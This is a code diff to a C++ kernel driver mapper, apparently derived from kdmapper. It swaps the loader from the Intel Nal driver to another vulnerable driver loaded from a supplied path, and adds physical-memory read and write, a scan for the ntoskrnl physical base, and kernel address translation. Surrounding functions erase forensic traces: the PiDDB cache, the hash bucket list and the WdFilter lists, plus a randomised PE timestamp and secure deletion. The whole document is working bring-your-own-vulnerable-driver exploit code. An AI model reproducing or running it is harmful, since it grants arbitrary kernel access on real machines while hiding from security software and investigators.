@@ -2,63 +2,31 @@
 #include <Windows.h>
 #include <string>
 #include <fstream>
+#include <vector>
+#include <filesystem>
 
 #include "utils.hpp"
-#include "intel_driver_resource.hpp"
 #include "service.hpp"
 #include "nt.hpp"
-#include "portable_executable.hpp"
 
-typedef struct _COPY_MEMORY_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved;
-	uint64_t source;
-	uint64_t destination;
-	uint64_t length;
-}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;
-
-typedef struct _FILL_MEMORY_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved1;
-	uint32_t value;
-	uint32_t reserved2;
-	uint64_t destination;
-	uint64_t length;
-}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;
-
-typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved;
-	uint64_t return_physical_address;
-	uint64_t address_to_translate;
-}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;
-
-typedef struct _MAP_IO_SPACE_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved;
-	uint64_t return_value;
-	uint64_t return_virtual_address;
-	uint64_t physical_address_to_map;
-	uint32_t size;
-}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;
-
-typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved1;
-	uint64_t reserved2;
-	uint64_t virt_address;
-	uint64_t reserved3;
-	uint32_t number_of_bytes;
-}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;
+#pragma pack(push, 1)
+typedef struct _PHYS_RW_INPUT {
+	uint64_t physical_address;
+	uint32_t byte_count;
+} PHYS_RW_INPUT;
+#pragma pack(pop)
 
 HANDLE intel_driver::hDevice = 0;
 ULONG64 intel_driver::ntoskrnlAddr = 0;
+ULONG64 intel_driver::ntoskrnlPhysBase = 0;
+ULONG32 intel_driver::ntoskrnlImageSize = 0;
+bool intel_driver::runtimeReady = false;
+ULONG32 intel_driver::loadedDriverTimestamp = 0;
+std::wstring intel_driver::vulnerableDriverPath = L"";
+
+static uint64_t kernel_MmGetPhysicalAddress = 0;
 static std::wstring cachedDriverName = L"";
+static std::wstring cachedDriverPath = L"";
 
 std::wstring intel_driver::GetDriverNameW() {
 	if (cachedDriverName.empty()) {
@@ -68,6 +36,9 @@ std::wstring intel_driver::GetDriverNameW() {
 }
 
 std::wstring intel_driver::GetDriverPath() {
+	if (!cachedDriverPath.empty())
+		return cachedDriverPath;
+
 	std::wstring temp = kdmUtils::GetFullTempPath();
 	if (temp.empty())
 		return L"";
@@ -75,11 +46,12 @@ std::wstring intel_driver::GetDriverPath() {
 	std::wstring subdir = temp + L"\\" + kdmUtils::GenerateCryptoRandomName(6, 10);
 	CreateDirectoryW(subdir.c_str(), NULL);
 
-	return subdir + L"\\" + GetDriverNameW() + L".sys";
+	cachedDriverPath = subdir + L"\\" + GetDriverNameW() + L".sys";
+	return cachedDriverPath;
 }
 
 bool intel_driver::IsRunning() {
-	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+	const HANDLE file_handle = CreateFileW(L"\\\\.\\__WDT__", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
 	{
 		CloseHandle(file_handle);
@@ -99,10 +71,10 @@ NTSTATUS intel_driver::AcquireDebugPrivilege() {
 	return Status;
 }
 
-static bool PatchDriverTimestamp(const std::wstring& driver_path) {
+static ULONG32 PatchDriverTimestamp(const std::wstring& driver_path) {
 	HANDLE hFile = CreateFileW(driver_path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (hFile == INVALID_HANDLE_VALUE)
-		return false;
+		return 0;
 
 	DWORD fileSize = GetFileSize(hFile, nullptr);
 	auto buffer = std::make_unique<BYTE[]>(fileSize);
@@ -112,16 +84,17 @@ static bool PatchDriverTimestamp(const std::wstring& driver_path) {
 	auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.get());
 	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
 		CloseHandle(hFile);
-		return false;
+		return 0;
 	}
 
 	auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(buffer.get() + dosHeader->e_lfanew);
 	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
 		CloseHandle(hFile);
-		return false;
+		return 0;
 	}
 
-	ntHeaders->FileHeader.TimeDateStamp = kdmUtils::CryptoRand32();
+	ULONG32 newTimestamp = kdmUtils::CryptoRand32();
+	ntHeaders->FileHeader.TimeDateStamp = newTimestamp;
 
 	ntHeaders->OptionalHeader.MajorOperatingSystemVersion = 10;
 	ntHeaders->OptionalHeader.MinorOperatingSystemVersion = 0;
@@ -131,7 +104,7 @@ static bool PatchDriverTimestamp(const std::wstring& driver_path) {
 	WriteFile(hFile, buffer.get(), fileSize, &bytesWritten, nullptr);
 	CloseHandle(hFile);
 
-	return true;
+	return newTimestamp;
 }
 
 static void SecureDeleteFile(const std::wstring& path) {
@@ -165,9 +138,226 @@ static void SecureDeleteFile(const std::wstring& path) {
 	RemoveDirectoryW(dir.c_str());
 }
 
+bool intel_driver::PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size) {
+	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
+		return false;
+
+	uint64_t offset = 0;
+	while (offset < size) {
+		uint32_t chunk = (uint32_t)((size - offset) < 0x1000 ? (size - offset) : 0x1000);
+
+		PHYS_RW_INPUT input = {};
+		input.physical_address = physical_address + offset;
+		input.byte_count = chunk;
+
+		DWORD bytes_returned = 0;
+		if (!DeviceIoControl(hDevice, IOCTL_PHYS_READ_BYTE_BULK,
+			&input, sizeof(input),
+			(uint8_t*)buffer + offset, chunk,
+			&bytes_returned, nullptr))
+			return false;
+
+		offset += chunk;
+	}
+	return true;
+}
+
+bool intel_driver::PhysicalWrite(uint64_t physical_address, const void* buffer, uint64_t size) {
+	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
+		return false;
+
+	uint64_t offset = 0;
+	while (offset < size) {
+		uint32_t chunk = (uint32_t)((size - offset) < 0x1000 ? (size - offset) : 0x1000);
+		uint32_t input_size = sizeof(PHYS_RW_INPUT) + chunk;
+		auto input_buf = std::make_unique<uint8_t[]>(input_size);
+
+		auto* header = reinterpret_cast<PHYS_RW_INPUT*>(input_buf.get());
+		header->physical_address = physical_address + offset;
+		header->byte_count = chunk;
+		memcpy(input_buf.get() + sizeof(PHYS_RW_INPUT), (const uint8_t*)buffer + offset, chunk);
+
+		DWORD bytes_returned = 0;
+		if (!DeviceIoControl(hDevice, IOCTL_PHYS_WRITE_BYTE_BULK,
+			input_buf.get(), input_size,
+			nullptr, 0,
+			&bytes_returned, nullptr))
+			return false;
+
+		offset += chunk;
+	}
+	return true;
+}
+
+bool intel_driver::ScanForNtoskrnlPhysBase() {
+	if (!ntoskrnlAddr)
+		return false;
+
+	ULONG bufferSize = 0;
+	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, nullptr, 0, &bufferSize);
+	if (!bufferSize)
+		return false;
+
+	auto modInfo = std::make_unique<uint8_t[]>(bufferSize);
+	if (!NT_SUCCESS(NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, modInfo.get(), bufferSize, &bufferSize)))
+		return false;
+
+	auto modules = reinterpret_cast<nt::PRTL_PROCESS_MODULES>(modInfo.get());
+	for (ULONG i = 0; i < modules->NumberOfModules; i++) {
+		if ((uint64_t)modules->Modules[i].ImageBase == ntoskrnlAddr) {
+			ntoskrnlImageSize = modules->Modules[i].ImageSize;
+			break;
+		}
+	}
+
+	if (!ntoskrnlImageSize)
+		return false;
+
+	const uint64_t LARGE_PAGE = 0x200000;
+	const uint64_t MAX_SCAN = 0x100000000ULL;
+
+	uint8_t header_buf[0x1000];
+
+	for (uint64_t pa = 0; pa < MAX_SCAN; pa += LARGE_PAGE) {
+		if (!PhysicalRead(pa, header_buf, sizeof(header_buf)))
+			continue;
+
+		auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(header_buf);
+		if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+			continue;
+
+		if (dos->e_lfanew <= 0 || (ULONG)dos->e_lfanew >= 0x800)
+			continue;
+
+		auto nt_hdr = reinterpret_cast<PIMAGE_NT_HEADERS64>(header_buf + dos->e_lfanew);
+		if (nt_hdr->Signature != IMAGE_NT_SIGNATURE)
+			continue;
+
+		if (nt_hdr->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+			continue;
+
+		if (nt_hdr->OptionalHeader.SizeOfImage != ntoskrnlImageSize)
+			continue;
+
+		auto exportDir = nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+		if (!exportDir.VirtualAddress || !exportDir.Size)
+			continue;
+
+		ntoskrnlPhysBase = pa;
+		return true;
+	}
+
+	return false;
+}
+
+bool intel_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
+	if (!address || !buffer || !size)
+		return false;
+
+	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
+		address >= ntoskrnlAddr && address + size <= ntoskrnlAddr + ntoskrnlImageSize) {
+		uint64_t pa = ntoskrnlPhysBase + (address - ntoskrnlAddr);
+		return PhysicalRead(pa, buffer, size);
+	}
+
+	if (!runtimeReady || !kernel_MmGetPhysicalAddress)
+		return false;
+
+	uint64_t offset = 0;
+	while (offset < size) {
+		uint64_t current_va = address + offset;
+		uint64_t page_offset = current_va & 0xFFF;
+		uint64_t chunk = size - offset;
+		if (chunk > 0x1000 - page_offset)
+			chunk = 0x1000 - page_offset;
+
+		LARGE_INTEGER pa_result = { 0 };
+		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, current_va))
+			return false;
+
+		if (!pa_result.QuadPart)
+			return false;
+
+		if (!PhysicalRead(pa_result.QuadPart, (uint8_t*)buffer + offset, chunk))
+			return false;
+
+		offset += chunk;
+	}
+	return true;
+}
+
+bool intel_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
+	if (!address || !buffer || !size)
+		return false;
+
+	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
+		address >= ntoskrnlAddr && address + size <= ntoskrnlAddr + ntoskrnlImageSize) {
+		uint64_t pa = ntoskrnlPhysBase + (address - ntoskrnlAddr);
+		return PhysicalWrite(pa, buffer, size);
+	}
+
+	if (!runtimeReady || !kernel_MmGetPhysicalAddress)
+		return false;
+
+	uint64_t offset = 0;
+	while (offset < size) {
+		uint64_t current_va = address + offset;
+		uint64_t page_offset = current_va & 0xFFF;
+		uint64_t chunk = size - offset;
+		if (chunk > 0x1000 - page_offset)
+			chunk = 0x1000 - page_offset;
+
+		LARGE_INTEGER pa_result = { 0 };
+		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, current_va))
+			return false;
+
+		if (!pa_result.QuadPart)
+			return false;
+
+		if (!PhysicalWrite(pa_result.QuadPart, (uint8_t*)buffer + offset, chunk))
+			return false;
+
+		offset += chunk;
+	}
+	return true;
+}
+
+bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
+	if (!address || !buffer || !size)
+		return false;
+
+	uint64_t physical_address = 0;
+
+	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
+		address >= ntoskrnlAddr && address < ntoskrnlAddr + ntoskrnlImageSize) {
+		physical_address = ntoskrnlPhysBase + (address - ntoskrnlAddr);
+	}
+	else if (runtimeReady && kernel_MmGetPhysicalAddress) {
+		LARGE_INTEGER pa_result = { 0 };
+		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, address))
+			return false;
+		physical_address = pa_result.QuadPart;
+	}
+	else {
+		return false;
+	}
+
+	if (!physical_address)
+		return false;
+
+	return PhysicalWrite(physical_address, buffer, size);
+}
+
 NTSTATUS intel_driver::Load() {
 	if (intel_driver::IsRunning())
 		return STATUS_ALREADY_REGISTERED;
+
+	if (vulnerableDriverPath.empty() || !std::filesystem::exists(vulnerableDriverPath))
+		return STATUS_NOT_FOUND;
+
+	std::vector<BYTE> driverData;
+	if (!kdmUtils::ReadFileToMemory(vulnerableDriverPath, &driverData))
+		return STATUS_DISK_OPERATION_FAILED;
 
 	std::wstring driver_path = GetDriverPath();
 	if (driver_path.empty())
@@ -175,10 +365,14 @@ NTSTATUS intel_driver::Load() {
 
 	_wremove(driver_path.c_str());
 
-	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver)))
+	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(driverData.data()), driverData.size()))
 		return STATUS_DISK_OPERATION_FAILED;
 
-	PatchDriverTimestamp(driver_path);
+	loadedDriverTimestamp = PatchDriverTimestamp(driver_path);
+	if (!loadedDriverTimestamp) {
+		SecureDeleteFile(driver_path);
+		return STATUS_UNSUCCESSFUL;
+	}
 
 	auto status = AcquireDebugPrivilege();
 	if (!NT_SUCCESS(status)) {
@@ -192,7 +386,7 @@ NTSTATUS intel_driver::Load() {
 		return status;
 	}
 
-	hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	hDevice = CreateFileW(L"\\\\.\\__WDT__", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
 	{
@@ -205,6 +399,19 @@ NTSTATUS intel_driver::Load() {
 		intel_driver::Unload();
 		return STATUS_BAD_DLL_ENTRYPOINT;
 	}
+
+	if (!ScanForNtoskrnlPhysBase()) {
+		intel_driver::Unload();
+		return STATUS_NOT_FOUND;
+	}
+
+	kernel_MmGetPhysicalAddress = GetKernelModuleExport(ntoskrnlAddr, "MmGetPhysicalAddress");
+	if (!kernel_MmGetPhysicalAddress) {
+		intel_driver::Unload();
+		return STATUS_ENTRYPOINT_NOT_FOUND;
+	}
+
+	runtimeReady = true;
 
 	IMAGE_DOS_HEADER dosHeader = { 0 };
 	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
@@ -323,235 +530,22 @@ bool intel_driver::ClearWdFilterDriverList() {
 }
 
 NTSTATUS intel_driver::Unload() {
+	runtimeReady = false;
+	kernel_MmGetPhysicalAddress = 0;
+	ntoskrnlPhysBase = 0;
+	ntoskrnlImageSize = 0;
+
 	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
 		CloseHandle(hDevice);
+	hDevice = 0;
 
 	auto status = service::StopAndRemove(GetDriverNameW());
-	if (!NT_SUCCESS(status))
-		return status;
 
 	std::wstring driver_path = GetDriverPath();
-	SecureDeleteFile(driver_path);
+	if (!driver_path.empty())
+		SecureDeleteFile(driver_path);
 
-	return STATUS_SUCCESS;
-}
-
-bool intel_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
-	if (!destination || !source || !size)
-		return 0;
-
-	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };
-	copy_memory_buffer.case_number = 0x33;
-	copy_memory_buffer.source = source;
-	copy_memory_buffer.destination = destination;
-	copy_memory_buffer.length = size;
-
-	DWORD bytes_returned = 0;
-	return DeviceIoControl(hDevice, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
-}
-
-bool intel_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
-	if (!address || !size)
-		return 0;
-
-	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };
-	fill_memory_buffer.case_number = 0x30;
-	fill_memory_buffer.destination = address;
-	fill_memory_buffer.value = value;
-	fill_memory_buffer.length = size;
-
-	DWORD bytes_returned = 0;
-	return DeviceIoControl(hDevice, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
-}
-
-bool intel_driver::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) {
-	if (!address)
-		return 0;
-
-	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };
-	get_phys_address_buffer.case_number = 0x25;
-	get_phys_address_buffer.address_to_translate = address;
-
-	DWORD bytes_returned = 0;
-	if (!DeviceIoControl(hDevice, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
-		return false;
-
-	*out_physical_address = get_phys_address_buffer.return_physical_address;
-	return true;
-}
-
-uint64_t intel_driver::MapIoSpace(uint64_t physical_address, uint32_t size) {
-	if (!physical_address || !size)
-		return 0;
-
-	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };
-	map_io_space_buffer.case_number = 0x19;
-	map_io_space_buffer.physical_address_to_map = physical_address;
-	map_io_space_buffer.size = size;
-
-	DWORD bytes_returned = 0;
-	if (!DeviceIoControl(hDevice, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
-		return 0;
-
-	return map_io_space_buffer.return_virtual_address;
-}
-
-bool intel_driver::UnmapIoSpace(uint64_t address, uint32_t size) {
-	if (!address || !size)
-		return false;
-
-	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };
-	unmap_io_space_buffer.case_number = 0x1A;
-	unmap_io_space_buffer.virt_address = address;
-	unmap_io_space_buffer.number_of_bytes = size;
-
-	DWORD bytes_returned = 0;
-	return DeviceIoControl(hDevice, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
-}
-
-bool intel_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
-	return MemCopy(reinterpret_cast<uint64_t>(buffer), address, size);
-}
-
-bool intel_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
-	return MemCopy(address, reinterpret_cast<uint64_t>(buffer), size);
-}
-
-bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
-	if (!address || !buffer || !size)
-		return false;
-
-	uint64_t physical_address = 0;
-	if (!GetPhysicalAddress(address, &physical_address))
-		return false;
-
-	const uint64_t mapped_physical_memory = MapIoSpace(physical_address, size);
-	if (!mapped_physical_memory)
-		return false;
-
-	bool result = WriteMemory(mapped_physical_memory, buffer, size);
-	UnmapIoSpace(mapped_physical_memory, size);
-	return result;
-}
-
-uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
-{
-	uint64_t allocated_pages{};
-	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;
-
-	if (!kernel_MmAllocateIndependentPagesEx)
-	{
-		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel((char*)".text", intel_driver::ntoskrnlAddr,
-			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
-			(char*)"xxxxxxxxx????xxx");
-		if (!kernel_MmAllocateIndependentPagesEx)
-			return 0;
-
-		kernel_MmAllocateIndependentPagesEx += 8;
-		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
-		if (!kernel_MmAllocateIndependentPagesEx)
-			return 0;
-	}
-
-	if (!intel_driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
-		return 0;
-
-	return allocated_pages;
-}
-
-bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
-{
-	static uint64_t kernel_MmFreeIndependentPages = 0;
-
-	if (!kernel_MmFreeIndependentPages)
-	{
-		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
-			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
-			(char*)"xxxxxxxxx????xxxxxxx");
-		if (!kernel_MmFreeIndependentPages) {
-			kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
-				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
-				(char*)"xx????xxxx????xxx");
-
-			if (!kernel_MmFreeIndependentPages)
-				return false;
-
-			kernel_MmFreeIndependentPages += 9;
-		}
-		else {
-			kernel_MmFreeIndependentPages += 8;
-		}
-
-		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
-		if (!kernel_MmFreeIndependentPages)
-			return false;
-	}
-
-	uint64_t result{};
-	return intel_driver::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
-}
-
-BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
-{
-	if (!address)
-		return FALSE;
-
-	static uint64_t kernel_MmSetPageProtection = 0;
-
-	if (!kernel_MmSetPageProtection)
-	{
-		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
-			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
-			(char*)"xx??x???xxx");
-		if (!kernel_MmSetPageProtection) {
-			kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
-				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
-				(char*)"xx??xx????x???xxx");
-			if (!kernel_MmSetPageProtection)
-				return FALSE;
-			kernel_MmSetPageProtection += 13;
-		}
-		else {
-			kernel_MmSetPageProtection += 10;
-		}
-
-		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmSetPageProtection, 1, 5);
-		if (!kernel_MmSetPageProtection)
-			return FALSE;
-	}
-
-	BOOLEAN set_prot_status{};
-	if (!intel_driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
-		return FALSE;
-
-	return set_prot_status;
-}
-
-uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
-	if (!size)
-		return 0;
-
-	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
-	if (!kernel_ExAllocatePool)
-		return 0;
-
-	uint64_t allocated_pool = 0;
-	ULONG randomTag = kdmUtils::GenerateRandomPoolTag();
-	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, randomTag))
-		return 0;
-
-	return allocated_pool;
-}
-
-bool intel_driver::FreePool(uint64_t address) {
-	if (!address)
-		return 0;
-
-	static uint64_t kernel_ExFreePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExFreePool");
-	if (!kernel_ExFreePool)
-		return 0;
-
-	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
+	return NT_SUCCESS(status) ? STATUS_SUCCESS : status;
 }
 
 uint64_t intel_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
@@ -777,7 +771,7 @@ bool intel_driver::ClearPiDDBCacheTable() {
 		return false;
 
 	auto n = GetDriverNameW();
-	auto timestamp = portable_executable::GetNtHeaders((void*)intel_driver_resource::driver)->FileHeader.TimeDateStamp;
+	auto timestamp = intel_driver::loadedDriverTimestamp;
 
 	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
 	if (pFoundEntry == nullptr) {
@@ -950,4 +944,124 @@ bool intel_driver::ClearKernelHashBucketList() {
 
 	ExReleaseResourceLite(g_HashCacheLock);
 	return false;
+}
+
+uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
+	if (!size)
+		return 0;
+
+	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
+	if (!kernel_ExAllocatePool)
+		return 0;
+
+	uint64_t allocated_pool = 0;
+	ULONG randomTag = kdmUtils::GenerateRandomPoolTag();
+	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, randomTag))
+		return 0;
+
+	return allocated_pool;
+}
+
+bool intel_driver::FreePool(uint64_t address) {
+	if (!address)
+		return 0;
+
+	static uint64_t kernel_ExFreePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExFreePool");
+	if (!kernel_ExFreePool)
+		return 0;
+
+	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
+}
+
+uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
+{
+	uint64_t allocated_pages{};
+	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;
+
+	if (!kernel_MmAllocateIndependentPagesEx)
+	{
+		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel((char*)".text", intel_driver::ntoskrnlAddr,
+			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
+			(char*)"xxxxxxxxx????xxx");
+		if (!kernel_MmAllocateIndependentPagesEx)
+			return 0;
+
+		kernel_MmAllocateIndependentPagesEx += 8;
+		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
+		if (!kernel_MmAllocateIndependentPagesEx)
+			return 0;
+	}
+
+	if (!intel_driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
+		return 0;
+
+	return allocated_pages;
+}
+
+bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
+{
+	static uint64_t kernel_MmFreeIndependentPages = 0;
+
+	if (!kernel_MmFreeIndependentPages)
+	{
+		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
+			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
+			(char*)"xxxxxxxxx????xxxxxxx");
+		if (!kernel_MmFreeIndependentPages) {
+			kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
+				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
+				(char*)"xx????xxxx????xxx");
+
+			if (!kernel_MmFreeIndependentPages)
+				return false;
+
+			kernel_MmFreeIndependentPages += 9;
+		}
+		else {
+			kernel_MmFreeIndependentPages += 8;
+		}
+
+		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
+		if (!kernel_MmFreeIndependentPages)
+			return false;
+	}
+
+	uint64_t result{};
+	return intel_driver::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
+}
+
+BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
+{
+	if (!address)
+		return FALSE;
+
+	static uint64_t kernel_MmSetPageProtection = 0;
+
+	if (!kernel_MmSetPageProtection)
+	{
+		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
+			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
+			(char*)"xx??x???xxx");
+		if (!kernel_MmSetPageProtection) {
+			kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
+				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
+				(char*)"xx??xx????x???xxx");
+			if (!kernel_MmSetPageProtection)
+				return FALSE;
+			kernel_MmSetPageProtection += 13;
+		}
+		else {
+			kernel_MmSetPageProtection += 10;
+		}
+
+		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmSetPageProtection, 1, 5);
+		if (!kernel_MmSetPageProtection)
+			return FALSE;
+	}
+
+	BOOLEAN set_prot_status{};
+	if (!intel_driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
+		return FALSE;
+
+	return set_prot_status;
 }
